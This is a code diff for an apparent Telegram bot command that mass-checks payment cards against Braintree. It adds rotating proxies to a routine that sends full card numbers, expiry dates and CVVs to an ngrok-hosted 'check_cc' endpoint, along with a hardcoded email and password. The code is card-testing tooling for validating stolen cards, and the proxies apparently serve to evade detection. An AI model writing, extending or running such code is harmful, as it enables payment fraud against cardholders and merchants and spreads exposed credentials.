@@ -8,6 +8,7 @@ sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
 from utils.database import get_credits, set_credits, get_plan, is_premium
 from utils.bin_database import get_bin_info
 from config import ADMIN_ID
+from config import get_random_proxy
 
 def setup_mass_b3_check_command(bot):
     @bot.message_handler(commands=['mb3'])
@@ -128,6 +129,7 @@ def process_single_b3_card(card_data, card_number):
             return f"❌ Tarjeta {card_number}: Año inválido", False
         
         # URL de Braintree
+        proxy = get_random_proxy()
         braintree_url = f"https://componential-unstruggling-shantel.ngrok-free.dev/check_cc?cc={cc_number}|{expiry_month}|{formatted_year}|{cvv}&email=wasdark336@gmail.com&password=bbmEZs65p!BJLNz"
         
         response = make_simple_request(braintree_url)
